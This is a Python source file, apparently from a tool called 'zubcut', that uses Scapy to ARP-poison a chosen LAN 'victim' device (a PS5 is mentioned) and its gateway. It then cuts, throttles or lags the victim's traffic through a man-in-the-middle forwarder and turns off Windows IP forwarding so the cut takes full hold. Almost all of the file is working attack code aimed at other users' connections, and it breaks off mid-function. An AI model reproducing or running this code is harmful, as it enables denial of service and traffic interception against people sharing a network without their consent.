from scapy.all import ARP, Ether, conf
from time import sleep
import sys
import threading

from networking.forwarder import MitmForwarder, _MAX_DELAY_MS, _MAX_SHAPING_KBPS
from tools.pfctl import ensure_pf_enabled, install_anchor, block_all_for, unblock_all_for
from tools.utils import (
    threaded,
    get_default_iface,
    get_iface_for_victim_ip,
    get_gateway_ip,
    get_gateway_mac,
    get_my_ip,
    good_mac,
    get_vendor,
    run_command,
    mac_address_is_usable,
    lookup_mac_from_arp_table,
    victim_endpoint_live_for_mitm,
    _lan_neighbor_mac_via_arp_probe,
    npcap_iface_tokens,
)
from constants import *
from tools.crash_feedback import safe_daemon_target


_forwarding_lock = threading.Lock()
_forwarding_desired: bool | None = None
_forwarding_worker: threading.Thread | None = None


def _set_ip_enable_router_registry(want: int) -> None:
    """Fast persistent IPEnableRouter write (no PowerShell)."""
    try:
        import winreg

        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, 'IPEnableRouter', 0, winreg.REG_DWORD, int(want))
        winreg.CloseKey(key)
        return
    except Exception:
        pass
    try:
        run_command(
            [
                'reg',
                'add',
                r'HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
                '/v',
                'IPEnableRouter',
                '/t',
                'REG_DWORD',
                '/d',
                str(int(want)),
                '/f',
            ],
            shell=False,
            timeout=5,
        )
    except Exception:
        pass


def _iface_indexes_from_netsh(show_out: str) -> list[str]:
    """Parse ``netsh interface ipv4 show interfaces`` Idx column."""
    return [idx for idx, _name in _iface_rows_from_netsh(show_out)]


def _iface_rows_from_netsh(show_out: str) -> list[tuple[str, str]]:
    """Parse ``netsh interface ipv4 show interfaces`` → [(idx, name), ...]."""
    rows: list[tuple[str, str]] = []
    for line in str(show_out or '').splitlines():
        parts = line.split()
        if len(parts) < 5 or not parts[0].isdigit():
            continue
        # Typical: "  12  25  1500  connected  Wi-Fi"
        rows.append((parts[0], ' '.join(parts[4:])))
    return rows


def _netsh_set_iface_forwarding(iface_key: str, enabled: bool) -> bool:
    """One fast per-iface netsh toggle. ``iface_key`` is index or interface name."""
    key = str(iface_key or '').strip()
    if not key:
        return False
    flag = 'enabled' if enabled else 'disabled'
    try:
        run_command(
            [
                'netsh',
                'interface',
                'ipv4',
                'set',
                'interface',
                key,
                f'forwarding={flag}',
            ],
            shell=False,
            timeout=3,
        )
        return True
    except Exception:
        return False


def _priority_iface_keys(priority_iface: str | None, show_out: str = '') -> list[str]:
    """Resolve active adapter to netsh keys (name + matching Idx)."""
    name = str(priority_iface or '').strip()
    if not name:
        return []
    keys = [name]
    name_l = name.lower()
    for idx, iface_name in _iface_rows_from_netsh(show_out):
        if iface_name.lower() == name_l or name_l in iface_name.lower():
            if idx not in keys:
                keys.append(idx)
            break
    return keys


def _apply_windows_ip_forwarding_ifaces(
    enabled: bool,
    *,
    priority_iface: str | None = None,
) -> None:
    """Per-interface runtime switch via netsh (avoid PowerShell cold-start on Kill)."""
    try:
        show = run_command(
            ['netsh', 'interface', 'ipv4', 'show', 'interfaces'],
            shell=False,
            timeout=6,
        )
    except Exception:
        show = ''
    show_s = str(show or '')
    # Kill hot path: flip the active NIC first (sync caller may have done this already).
    for key in _priority_iface_keys(priority_iface, show_s):
        _netsh_set_iface_forwarding(key, enabled)
    indexes = _iface_indexes_from_netsh(show_s)
    if not indexes:
        # Fallback once — slower, but only when netsh parse fails.
        try:
            ps_flag = 'Enabled' if enabled else 'Disabled'
            run_command(
                [
                    'powershell',
                    '-NoProfile',
                    '-WindowStyle',
                    'Hidden',
                    '-Command',
                    'Get-NetIPInterface -AddressFamily IPv4 -ErrorAction SilentlyContinue | '
                    'ForEach-Object { '
                    'Set-NetIPInterface -InterfaceIndex $_.InterfaceIndex '
                    f"-AddressFamily IPv4 -Forwarding {ps_flag} -ErrorAction SilentlyContinue "
                    '}',
                ],
                shell=False,
                timeout=12,
            )
        except Exception:
            pass
        return
    for idx in indexes:
        try:
            _netsh_set_iface_forwarding(idx, enabled)
        except Exception:
            continue


_forwarding_priority_iface: str | None = None


def _drain_windows_ip_forwarding_applies() -> None:
    """Apply `_forwarding_desired` until stable (used by background worker / blocking)."""
    global _forwarding_worker
    while True:
        with _forwarding_lock:
            target = _forwarding_desired
            prio = _forwarding_priority_iface
        if target is None:
            break
        try:
            _apply_windows_ip_forwarding_ifaces(target, priority_iface=prio)
        except Exception:
            pass
        with _forwarding_lock:
            if _forwarding_desired is target:
                _forwarding_worker = None
                return


def _set_windows_ip_forwarding(
    enabled: bool,
    *,
    blocking: bool = False,
    priority_iface: str | None = None,
) -> None:
    """Runtime + persistent IPv4 forwarding toggle (Windows).

    ``netsh interface ipv4 set global forwarding=…`` is **invalid** — forwarding is
    per-interface. Kill's hot path must not block on PowerShell (multi-second delay);
    registry + active NIC are sync, remaining ifaces are background unless
    ``blocking=True`` (startup).
    """
    global _forwarding_desired, _forwarding_worker, _forwarding_priority_iface
    if not sys.platform.startswith('win'):
        return
    want = 1 if enabled else 0
    # Cheap registry flip only on the caller thread — never stall Kill on netsh.
    _set_ip_enable_router_registry(want)
    prio = str(priority_iface or '').strip() or None

    with _forwarding_lock:
        already = _forwarding_desired is enabled
        _forwarding_desired = enabled
        if prio:
            _forwarding_priority_iface = prio
        worker_alive = _forwarding_worker is not None and _forwarding_worker.is_alive()
        if blocking:
            pass
        elif already and not prio:
            # Same target already requested — Kill must not wait on netsh again.
            return
        elif worker_alive:
            # Worker will re-read `_forwarding_desired` / priority iface.
            return
        else:
            thr = threading.Thread(
                target=safe_daemon_target(_drain_windows_ip_forwarding_applies),
                name='zubcut-ip-forwarding',
                daemon=True,
            )
            _forwarding_worker = thr
            thr.start()
            return

    # blocking path (startup clean): apply now on this thread.
    _drain_windows_ip_forwarding_applies()


def is_ip_forwarding_enabled() -> bool:
    """True when Windows kernel/global IPv4 forwarding is on (breaks MITM cut if forwarder absent)."""
    if not sys.platform.startswith('win'):
        return False
    try:
        import winreg

        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
            0,
            winreg.KEY_READ,
        )
        val, _ = winreg.QueryValueEx(key, 'IPEnableRouter')
        winreg.CloseKey(key)
        if int(val or 0) != 0:
            return True
    except Exception:
        pass
    try:
        out = run_command(
            ['netsh', 'interface', 'ipv4', 'show', 'interfaces'],
            shell=False,
            timeout=6,
        )
        text = str(out or '').lower()
        # Per-iface lines include a Forwarding column when queried individually;
        # show interfaces listing is enough for a coarse hint when registry is 0.
        if 'forwarding' in text and 'enabled' in text:
            return True
    except Exception:
        pass
    return False


def enable_ip_forwarding(*, blocking: bool = False, priority_iface: str | None = None):
    """Enable kernel IP forwarding (Windows: IPEnableRouter + per-iface netsh)."""
    _set_windows_ip_forwarding(True, blocking=blocking, priority_iface=priority_iface)


def disable_ip_forwarding(*, blocking: bool = False, priority_iface: str | None = None):
    """Disable kernel IP forwarding so MITM forwarder is the only relay path.

    Non-blocking by default (registry sync + background netsh). Call **after**
    instant poison/cut on Kill — never before. Startup may pass ``blocking=True``.
    ``priority_iface`` (e.g. ``Wi-Fi``) is applied first in the background worker.
    """
    _set_windows_ip_forwarding(False, blocking=blocking, priority_iface=priority_iface)


class Killer:
    def __init__(self, router=DUMMY_ROUTER):
        self.iface = get_default_iface()
        # Use guid (Scapy/pcap name) for conf.iface, not friendly name
        conf.iface = self.iface.guid if self.iface.guid else self.iface.name
        # Home-LAN Kill/Lag uses the userspace MitmForwarder. Leaving kernel
        # forwarding ON lets Windows relay redirected frames and makes Kill only
        # partial. Clumsy/ICS enables forwarding itself when needed.
        self.router = router
        self.killed = {}
        self.storage = {}
        self.forwarders = {}
        self.pf_blocks = set()
        self._socket = None  # Persistent L2 socket
        self._socket_token: str | None = None  # Npcap bind token that opened _socket
        self._op_seq = {}  # MAC -> operation generation to cancel stale workers

    def _next_op_seq(self, mac):
        seq = int(self._op_seq.get(mac, 0)) + 1
        self._op_seq[mac] = seq
        return seq
    
    def _iface_l2_tokens(self) -> list[str]:
        if not self.iface or getattr(self.iface, 'name', None) in (None, '', 'NULL'):
            return []
        return npcap_iface_tokens(self.iface)

    def l2_socket_ready(self) -> bool:
        """True when the cached Npcap L2 socket is open for the current adapter."""
        sock = self._socket
        if sock is None:
            return False
        try:
            return not getattr(sock, 'closed', False)
        except Exception:
            return True

    def prewarm_l2_socket(self, *, join_ms: int = 0) -> bool:
        """
        Open/cache the Npcap L2 socket before the first Kill/Lag click.

        ``join_ms`` > 0 blocks up to that many ms (instant-cut path uses ~120ms).
        """
        if self.l2_socket_ready():
            return True
        if join_ms > 0:
            holder = {'ok': False}

            def _work() -> None:
                holder['ok'] = self._get_socket() is not None

            th = threading.Thread(
                target=safe_daemon_target(_work),
                name='zubcut-npcap-prewarm-sync',
                daemon=True,
            )
            th.start()
            th.join(max(0, int(join_ms)) / 1000.0)
            return bool(holder['ok'])
        try:
            threading.Thread(
                target=safe_daemon_target(self._get_socket),
                name='zubcut-npcap-prewarm',
                daemon=True,
            ).start()
        except Exception:
            pass
        return self.l2_socket_ready()

    def _get_socket(self):
        """Get or create persistent L2 socket — tries all Npcap bind tokens (GUID + name)."""
        if self.l2_socket_ready():
            return self._socket
        self._socket = None
        self._socket_token = None
        for tok in self._iface_l2_tokens():
            try:
                self._socket = conf.L2socket(iface=tok)
                self._socket_token = tok
                try:
                    conf.iface = tok
                except Exception:
                    pass
                return self._socket
            except Exception:
                self._socket = None
                self._socket_token = None
                continue
        return None
    
    def _send_packet(self, packet):
        """Send packet using persistent socket, fallback to new socket if needed"""
        sock = self._get_socket()
        if sock:
            try:
                sock.send(packet)
                return
            except Exception:
                # Socket died, recreate
                self._close_socket()
        
        # Fallback: direct send (creates new socket) — try every Npcap token.
        try:
            from scapy.all import sendp

            for tok in self._iface_l2_tokens():
                try:
                    sendp(packet, iface=tok, verbose=0)
                    return
                except Exception:
                    continue
        except Exception:
            pass
    
    def _close_socket(self):
        """Close persistent socket"""
        if self._socket:
            try:
                self._socket.close()
            except Exception:
                pass
            self._socket = None
        self._socket_token = None

    def _sync_iface_for_victim(self, victim, *, refresh_router=True):
        """
        Rebind killer iface/router context to whatever NIC reaches victim['ip'].
        Safe no-op if already on the right interface.

        On Clumsy hotspot (ICS), caller must pass refresh_router=False and set router
        to 192.168.137.1 via apply_clumsy_ics_router_context — otherwise we pick the
        home LAN gateway and break hotspot internet / stick ARP "on" after OFF.
        """
        ip = victim.get('ip') if isinstance(victim, dict) else None
        if not ip:
            return
        target = get_iface_for_victim_ip(ip, fallback=self.iface)
        same_iface = (
            getattr(target, 'guid', None) == getattr(self.iface, 'guid', None)
            and getattr(target, 'name', None) == getattr(self.iface, 'name', None)
        )
        if same_iface and not refresh_router:
            return
        if same_iface:
            return
        self.iface = target
        self._close_socket()
        guid = self.iface.guid if getattr(self.iface, 'guid', None) else self.iface.name
        try:
            conf.iface = guid
        except Exception:
            pass
        iface_ip = get_my_ip(guid)
        self.iface.ip = iface_ip
        self.iface.mac = good_mac(getattr(self.iface, 'mac', GLOBAL_MAC))
        if not refresh_router:
            return
        router_ip = get_gateway_ip(guid)
        router_mac = get_gateway_mac(iface_ip, router_ip)
        if (
            sys.platform.startswith('win')
            and router_ip
            and not mac_address_is_usable(router_mac)
        ):
            try:
                run_command(
                    ['ping', '-n', '1', '-w', '500', str(router_ip)],
                    shell=False,
                    timeout=2,
                )
            except Exception:
                pass
            router_mac = get_gateway_mac(iface_ip, router_ip)
        self.router = {
            'ip': router_ip,
            'mac': router_mac,
            'vendor': get_vendor(router_mac),
            'type': 'Router',
            'name': '',
            'admin': True,
        }
    
    def _refresh_router_mac_for_mitm(self) -> None:
        """Best-effort gateway MAC for MITM when ARP cache is cold after Kill OFF."""
        router_ip = str((self.router or {}).get('ip') or '').strip()
        if not router_ip:
            return
        iface_ip = str(getattr(self.iface, 'ip', None) or '').strip()
        mac = lookup_mac_from_arp_table(router_ip, iface_ip)
        if not mac_address_is_usable(mac) and sys.platform.startswith('win'):
            try:
                run_command(
                    ['ping', '-n', '1', '-w', '800', router_ip],
                    shell=False,
                    timeout=2,
                )
            except Exception:
                pass
            mac = lookup_mac_from_arp_table(router_ip, iface_ip)
        if not mac_address_is_usable(mac):
            try:
                guid = getattr(self.iface, 'guid', None) or self.iface.name
                mac = get_gateway_mac(iface_ip, router_ip)
            except Exception:
                mac = GLOBAL_MAC
        if mac_address_is_usable(mac) and isinstance(self.router, dict):
            self.router['mac'] = mac

    def mitm_prereqs_ok(self, victim, *, ping_attempts: int = 1) -> tuple[bool, str]:
        """True when victim + router MACs are known enough to MITM on LAN."""
        if not isinstance(victim, dict):
            return False, 'no victim'
        if self.iface.name == 'NULL':
            return False, 'no network adapter'
        if not mac_address_is_usable((self.router or {}).get('mac')):
            self._refresh_router_mac_for_mitm()
        if not mac_address_is_usable((self.router or {}).get('mac')):
            return False, 'router MAC unknown (ping gateway, check Npcap)'
        if not mac_address_is_usable(getattr(self.iface, 'mac', None)):
            return False, 'PC adapter MAC unknown'
        self._refresh_victim_mac_from_cache(victim)
        iface_guid = ''
        try:
            iface_guid = str(
                getattr(self.iface, 'guid', None) or getattr(self.iface, 'name', None) or ''
            ).strip()
        except Exception:
            iface_guid = ''
        victim_ip = str(victim.get('ip') or '').strip()
        if victim_ip:
            probed = _lan_neighbor_mac_via_arp_probe(
                victim_ip, iface_guid, iface=self.iface
            )
            if mac_address_is_usable(probed):
                victim['mac'] = probed
        if not mac_address_is_usable(victim.get('mac')):
            return False, 'victim MAC unknown (ping PS5, rescan)'
        live_ok, live_reason = victim_endpoint_live_for_mitm(
            victim.get('ip'),
            victim.get('mac'),
            getattr(self.iface, 'ip', None),
            ping_attempts=max(1, int(ping_attempts)),
            arp_probe_iface=iface_guid or None,
        )
        if not live_ok:
            return False, live_reason
        return True, ''

    def _refresh_victim_mac_from_cache(self, victim) -> None:
        """Best-effort ARP cache refresh for victim MAC before poison."""
        if not isinstance(victim, dict):
            return
        ip = str(victim.get('ip') or '').strip()
        if not ip:
            return
        iface_ip = str(getattr(self.iface, 'ip', None) or '').strip()
        mac = lookup_mac_from_arp_table(ip, iface_ip)
        if not mac_address_is_usable(mac) and sys.platform.startswith('win'):
            try:
                run_command(
                    ['ping', '-n', '1', '-w', '500', ip],
                    shell=False,
                    timeout=2,
                )
            except Exception:
                pass
            mac = lookup_mac_from_arp_table(ip, iface_ip)
        if mac_address_is_usable(mac):
            victim['mac'] = mac

    def kill(self, victim, wait_after=2, *, traffic_cut=True, ics_mode=False):
        """
        Spoofing victim.
        Default 2 second delay - ARP cache lasts 30-120s, no need to spam.
        Prevents Windows NDIS throttling.

        Registers ``self.killed`` on the caller thread so UI state (e.g. toggleKill)
        stays in sync; only the ARP loop runs in a background thread.

        ``traffic_cut=False`` arms ARP MITM only (Percent Cut / link shaping set their
        own forwarder pass ratios — calling kill() with the default 0% cut first made
        Percent Cut feel like a full Kill until OFF).

        Instant cut order (must stay first): poison → ARP worker → 0% traffic cut.
        Forwarding disable + full-cut reinforce run only after that arm.
        """
        self._sync_iface_for_victim(victim, refresh_router=not ics_mode)
        self._refresh_victim_mac_from_cache(victim)
        mac = victim['mac']
        # Reassert path: even if already marked killed, refresh victim record and restart
        # ARP worker generation so ON state recovers from stale/desynced workers.
        seq = self._next_op_seq(mac)
        self.killed[mac] = victim
        self._stop_forwarder(mac)
        # Instant path first: poison + cut. Forwarding disable / probes come after.
        self._poison_arp_now(victim, seq, repeats=3, delay_s=0)
        self._kill_arp_worker(
            victim,
            wait_after,
            seq,
            aggressive=bool(traffic_cut and not ics_mode),
        )
        if not ics_mode and traffic_cut:
            self._apply_traffic_cut_sync(victim)
        if not ics_mode:
            # After cut is armed — seal kernel relay without delaying the first hit.
            disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
        if not ics_mode and traffic_cut:
            # Background only: reseal poison/cut/forwarding without delaying the click.
            self._reinforce_full_cut_async(victim)

    def _apply_traffic_cut_sync(self, victim):
        """Start 100% drop forwarder on the caller thread (Kill must not miss re-arm)."""
        if not isinstance(victim, dict):
            return False
        mac = victim.get('mac')
        if not mac or mac not in self.killed:
            return False
        # Hot path: GUI already validated live MITM; do not re-ping here.
        if not mac_address_is_usable((self.router or {}).get('mac')):
            return False
        if not mac_address_is_usable(victim.get('mac')):
            return False
        self.apply_percent_cut(victim, pass_percent=0)
        fw = self.forwarders.get(mac)
        return bool(fw and getattr(fw, 'running', False))

    @threaded
    def apply_traffic_cut(self, victim):
        """
        Drop all victim IP traffic that reaches us via ARP MITM.

        ARP poison alone is not enough on Windows when IP forwarding is enabled —
        the kernel may still relay frames unless user-space intercepts and drops them.
        """
        self._apply_traffic_cut_sync(victim)

    def reassert_poison(self, victim, repeats=3):
        """
        Extra poison burst without bumping ``_op_seq`` or restarting the ARP worker.

        Lag start reassert timers (0/40/110 ms) must use this — calling ``kill()``
        again cancels the worker mid-loop and MITM never sustains (no lag at all).
        """
        mac = victim.get('mac') if isinstance(victim, dict) else None
        if not mac or mac not in self.killed:
            return
        seq = int(self._op_seq.get(mac, 0))
        self._poison_arp_now(victim, seq, repeats=max(1, int(repeats)), delay_s=0)

    def _seal_hard_drop(self, mac) -> bool:
        """Ensure a live forwarder hard-drops both directions (full Kill)."""
        fw = self.forwarders.get(mac)
        if not (fw and getattr(fw, 'running', False)):
            return False
        try:
            fw.drop_from_victim = True
            fw.drop_to_victim = True
            fw.pass_from_victim_pct = 0
            fw.pass_to_victim_pct = 0
            return True
        except Exception:
            return False

    def reinforce_full_cut(self, victim, *, rounds=4):
        """
        Post-instant Kill seal: re-poison, reseal 0% hard-drop, retry forwarder,
        and re-disable kernel IP forwarding.

        Never call this before the instant poison/cut path — it is a background
        follow-up for environments where the first hit only feels like lag.
        Does not bump ``_op_seq`` (would cancel the live ARP worker).
        """
        if not isinstance(victim, dict):
            return
        mac = victim.get('mac')
        if not mac or mac not in self.killed:
            return
        rounds = max(1, min(8, int(rounds)))
        for i in range(rounds):
            if mac not in self.killed:
                return
            self.reassert_poison(victim, repeats=4)
            if not self._seal_hard_drop(mac):
                # Forwarder missing/dead — retry full cut (still post-instant).
                self._apply_traffic_cut_sync(victim)
                self._seal_hard_drop(mac)
            disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
            if i + 1 < rounds:
                sleep(0.05 + (0.05 * i))

    def _reinforce_full_cut_async(self, victim) -> None:
        """Schedule ``reinforce_full_cut`` off the Kill click / GUI thread."""
        if not isinstance(victim, dict):
            return
        snap = {
            'mac': victim.get('mac'),
            'ip': victim.get('ip'),
            'vendor': victim.get('vendor'),
        }
        if not snap.get('mac'):
            return

        def _work() -> None:
            try:
                # Yield so the instant arm returns / UI paints first.
                sleep(0.02)
                if snap.get('mac') not in self.killed:
                    return
                live = self.killed.get(snap['mac']) or snap
                self.reinforce_full_cut(live if isinstance(live, dict) else snap)
            except Exception:
                pass

        try:
            threading.Thread(
                target=safe_daemon_target(_work),
                name='zubcut-kill-full-cut',
                daemon=True,
            ).start()
        except Exception:
            pass

    def _poison_frames(self, victim):
        """Unicast ARP poison only (victim + router).

        Do **not** broadcast gateway impersonation. A ff:ff:ff ARP with
        ``psrc=router`` teaches every listening client that this PC is the
        gateway and can drop whole-LAN internet.

        Send both ARP *request* (op=1) and *reply* (op=2) unicast to the
        victim and router. Many stacks ignore unsolicited unicast replies but
        still cache the sender mapping from a request — reply-only poison was
        too weak after broadcast removal.
        """
        # Victim: "router is at PC MAC"
        to_victim_req = Ether(dst=victim['mac']) / ARP(
            op=1,
            psrc=self.router['ip'],
            hwsrc=self.iface.mac,
            pdst=victim['ip'],
            hwdst=victim['mac'],
        )
        to_victim_reply = Ether(dst=victim['mac']) / ARP(
            op=2,
            psrc=self.router['ip'],
            hwsrc=self.iface.mac,
            pdst=victim['ip'],
            hwdst=victim['mac'],
        )
        # Router: "victim is at PC MAC"
        to_router_req = Ether(dst=self.router['mac']) / ARP(
            op=1,
            psrc=victim['ip'],
            hwsrc=self.iface.mac,
            pdst=self.router['ip'],
            hwdst=self.router['mac'],
        )
        to_router_reply = Ether(dst=self.router['mac']) / ARP(
            op=2,
            psrc=victim['ip'],
            hwsrc=self.iface.mac,
            pdst=self.router['ip'],
            hwdst=self.router['mac'],
        )
        # Router ARP recovers faster from direct victim frames — send router-side
        # poison twice per burst so inbound MITM (full Kill) holds with outbound.
        return [
            to_victim_req,
            to_victim_reply,
            to_router_req,
            to_router_reply,
            to_router_req,
            to_router_reply,
        ]

    def _poison_arp_now(self, victim, seq=0, repeats=1, delay_s=0.0):
        """Best-effort immediate ARP poison burst; aborts if a newer op supersedes this sequence.

        Designed for the GUI thread — uses ONLY the cached L2 socket. If the
        cache is cold (prewarm hasn't finished, or _close_socket was called),
        we skip the burst and let the threaded ARP worker open the socket off
        the GUI thread. Opening conf.L2socket() on Windows costs 0.5–2 s and
        would freeze the UI between button-press and row-highlight.
        """
        if self.iface.name == 'NULL':
            return
        sock = self._socket
        if sock is None:
            # Cold Npcap socket: race a short blocking prewarm so poison can go sync.
            if self.prewarm_l2_socket(join_ms=120):
                sock = self._socket
        if sock is None:
            # Still cold — background burst + socket warm for the ARP worker.
            self._poison_arp_now_async(victim, seq, repeats, delay_s)
            return
        frames = self._poison_frames(victim)

        for _ in range(max(1, int(repeats))):
            if self._op_seq.get(victim['mac']) != seq or victim['mac'] not in self.killed:
                break
            try:
                for frame in frames:
                    sock.send(frame)
            except Exception:
                # Socket died mid-burst — let the threaded worker recover.
                self._socket = None
                return
            if delay_s > 0:
                sleep(delay_s)

    def _poison_arp_now_async(self, victim, seq=0, repeats=1, delay_s=0.0):
        """Background poison burst when the cached L2 socket is cold."""

        def _work():
            try:
                from scapy.all import sendp

                tokens = self._iface_l2_tokens()
                if not tokens:
                    return
                frames = self._poison_frames(victim)
                for _ in range(max(1, int(repeats))):
                    if self._op_seq.get(victim['mac']) != seq or victim['mac'] not in self.killed:
                        break
                    sent = False
                    for tok in tokens:
                        try:
                            for frame in frames:
                                sendp(frame, iface=tok, verbose=0)
                            sent = True
                            break
                        except Exception:
                            continue
                    if not sent:
                        break
                    if delay_s > 0:
                        sleep(delay_s)
                # Warm the persistent socket for the worker loop.
                self._get_socket()
            except Exception:
                pass

        try:
            threading.Thread(
                target=safe_daemon_target(_work),
                name='zubcut-poison-burst',
                daemon=True,
            ).start()
        except Exception:
            pass

    def apply_percent_cut(self, victim, pass_percent=100, debug=False):
        """
        Keep MITM active and forward only a percentage of packets (both directions).
        """
        mac = victim.get('mac') if isinstance(victim, dict) else None
        if not mac:
            return False
        if mac not in self.killed:
            # 0.0: Percent Cut ON must feel instant (Lag/Kill preblock parity).
            self.kill(victim, wait_after=0.0, traffic_cut=False)
        else:
            self._stop_forwarder(mac)
        pass_percent = max(0, min(100, int(pass_percent)))
        pass_from_victim = pass_percent
        pass_to_victim = pass_percent

        if not self.router.get('mac'):
            return False
        tokens = npcap_iface_tokens(self.iface)
        if not tokens:
            return False
        self._get_socket()
        # Full Kill (0%): hard-drop both directions in addition to pass ratio.
        hard_drop = pass_percent <= 0
        fw = MitmForwarder(debug=debug)
        fw.start(
            victim=victim,
            router=self.router,
            iface_name=tokens[0],
            iface_mac=self.iface.mac,
            drop_from_victim=hard_drop,
            drop_to_victim=hard_drop,
            pass_from_victim_pct=pass_from_victim,
            pass_to_victim_pct=pass_to_victim,
            iface_alts=tokens[1:],
        )
        self.forwarders[mac] = fw
        if not (fw and getattr(fw, 'running', False)):
            self.forwarders.pop(mac, None)
            return False
        # Seal kernel relay after the forwarder is live — never before the cut.
        disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
        return True

    def disable_percent_cut(self, mac):
        self._stop_forwarder(mac)

    def resume_percent_cut_live(self, mac) -> bool:
        """Set forwarder to 100% pass without stopping Npcap (instant OFF feel)."""
        mac = str(mac or '').strip()
        if not mac:
            return False
        fw = self.forwarders.get(mac)
        if fw is None:
            return False
        try:
            if hasattr(fw, 'pass_all_live'):
                fw.pass_all_live()
            else:
                fw.pass_from_victim_pct = 100
                fw.pass_to_victim_pct = 100
                fw.drop_from_victim = False
                fw.drop_to_victim = False
            return True
        except Exception:
            return False

    def apply_link_shaping(
        self,
        victim,
        *,
        delay_ms_out=0,
        delay_ms_in=0,
        jitter_ms_out=0,
        jitter_ms_in=0,
        loss_pct_out=0,
        loss_pct_in=0,
        max_kbps_out=0.0,
        max_kbps_in=0.0,
        debug=False,
    ):
        """
        Forwarder with per-direction delay, optional jitter, loss %, and token-bucket caps.
        """
        if victim['mac'] not in self.killed:
            self.kill(victim, wait_after=0.08, traffic_cut=False)
        delay_ms_out = max(0, min(_MAX_DELAY_MS, int(delay_ms_out)))
        delay_ms_in = max(0, min(_MAX_DELAY_MS, int(delay_ms_in)))
        jitter_ms_out = max(0, min(_MAX_DELAY_MS, int(jitter_ms_out)))
        jitter_ms_in = max(0, min(_MAX_DELAY_MS, int(jitter_ms_in)))
        loss_pct_out = max(0, min(100, int(loss_pct_out)))
        loss_pct_in = max(0, min(100, int(loss_pct_in)))
        max_kbps_out = max(0.0, min(_MAX_SHAPING_KBPS, float(max_kbps_out)))
        max_kbps_in = max(0.0, min(_MAX_SHAPING_KBPS, float(max_kbps_in)))
        if victim['mac'] in self.forwarders:
            self.forwarders[victim['mac']].stop()
        if not self.router.get('mac'):
            return
        tokens = npcap_iface_tokens(self.iface)
        if not tokens:
            return
        self._get_socket()
        fw = MitmForwarder(debug=debug)
        fw.start(
            victim=victim,
            router=self.router,
            iface_name=tokens[0],
            iface_mac=self.iface.mac,
            drop_from_victim=False,
            drop_to_victim=False,
            pass_from_victim_pct=100,
            pass_to_victim_pct=100,
            delay_ms_from_victim=delay_ms_out,
            delay_ms_to_victim=delay_ms_in,
            jitter_ms_from_victim=jitter_ms_out,
            jitter_ms_to_victim=jitter_ms_in,
            loss_pct_from_victim=loss_pct_out,
            loss_pct_to_victim=loss_pct_in,
            max_kbps_from_victim=max_kbps_out,
            max_kbps_to_victim=max_kbps_in,
            iface_alts=tokens[1:],
        )
        self.forwarders[victim['mac']] = fw
        disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))

    @threaded
    def _kill_arp_worker(self, victim, wait_after=2, seq=0, *, aggressive=False):
        frames = self._poison_frames(victim)

        # Front-load short-interval reasserts so a missed first poison still sticks.
        # Kill (traffic_cut) uses a denser warmup; Lag/PctCut keep the lighter cadence.
        if aggressive:
            warmup_remaining = 8
            warmup_gap = 0.05
        else:
            warmup_remaining = 4
            warmup_gap = 0.08
        while (
            victim['mac'] in self.killed
            and self.iface.name != 'NULL'
            and self._op_seq.get(victim['mac']) == seq
        ):
            for frame in frames:
                self._send_packet(frame)
            if warmup_remaining > 0:
                warmup_remaining -= 1
                sleep(warmup_gap)
                continue
            # Sleep in short slices so OFF takes effect quickly (avoid UI/backend desync feel).
            total_wait = max(0.05, float(wait_after))
            slept = 0.0
            step = 0.05
            while slept < total_wait:
                if (
                    victim['mac'] not in self.killed
                    or self.iface.name == 'NULL'
                    or self._op_seq.get(victim['mac']) != seq
                ):
                    break
                sleep(step)
                slept += step

        if victim['mac'] not in self.killed:
            self._stop_forwarder(victim['mac'])

    def unkill(self, victim, *, ics_mode=False):
        """
        Unspoofing victim.

        Removes from ``self.killed`` on the caller thread before ARP restore runs
        in the background, so the UI does not race with _sync_killed_devices().
        """
        self._sync_iface_for_victim(victim, refresh_router=not ics_mode)
        seq = self._next_op_seq(victim['mac'])
        if victim['mac'] in self.killed:
            self.killed.pop(victim['mac'])
        self._stop_forwarder(victim['mac'])
        # Immediate ARP burst with no sleep — sleeps belong in @threaded _unkill_restore_worker
        # so the GUI thread returns instantly on Kill/Lag/Dupe OFF.
        self._restore_arp_now(victim, seq, repeats=3, delay_s=0)
        self._unkill_restore_worker(victim, seq, quick=ics_mode)

    def reinforce_restore(self, victim, *, ics_mode=False):
        """
        Extra best-effort restore packets for a victim that should already be OFF.
        Safe no-op when victim is currently killed again.
        """
        mac = victim.get('mac') if isinstance(victim, dict) else None
        if not mac:
            return
        if mac in self.killed:
            return
        self._sync_iface_for_victim(victim, refresh_router=not ics_mode)
        seq = self._op_seq.get(mac, 0)
        self._restore_arp_now(victim, seq, repeats=2, delay_s=0)

    def _restore_arp_now(self, victim, seq=0, repeats=1, delay_s=0.1):
        """Best-effort ARP restore; aborts if a newer op supersedes this sequence."""
        to_victim = Ether(dst=victim['mac'])/ARP(
            op=2,
            psrc=self.router['ip'],
            hwsrc=self.router['mac'],
            pdst=victim['ip'],
            hwdst=victim['mac']
        )

        to_router = Ether(dst=self.router['mac'])/ARP(
            op=2,
            psrc=victim['ip'],
            hwsrc=victim['mac'],
            pdst=self.router['ip'],
            hwdst=self.router['mac']
        )

        if self.iface.name == 'NULL':
            return
        for _ in range(max(1, int(repeats))):
            if self._op_seq.get(victim['mac']) != seq or victim['mac'] in self.killed:
                break
            self._send_packet(to_victim)
            self._send_packet(to_router)
            if delay_s > 0:
                sleep(delay_s)

    @threaded
    def _unkill_restore_worker(self, victim, seq=0, *, quick=False):
        # Follow-up restore bursts so late poison frames do not re-break connectivity.
        # ICS hotspot uses a short plan — PS5 should recover in under ~300ms, not ~2s.
        if quick:
            plan = ((0.0, 2), (0.08, 1))
        else:
            plan = (
                (0.0, 2),
                (0.25, 2),
                (0.75, 2),
                (1.5, 2),
            )
        for wait_s, repeats in plan:
            if self._op_seq.get(victim['mac']) != seq or victim['mac'] in self.killed:
                return
            if wait_s > 0:
                sleep(wait_s)
            if self._op_seq.get(victim['mac']) != seq or victim['mac'] in self.killed:
                return
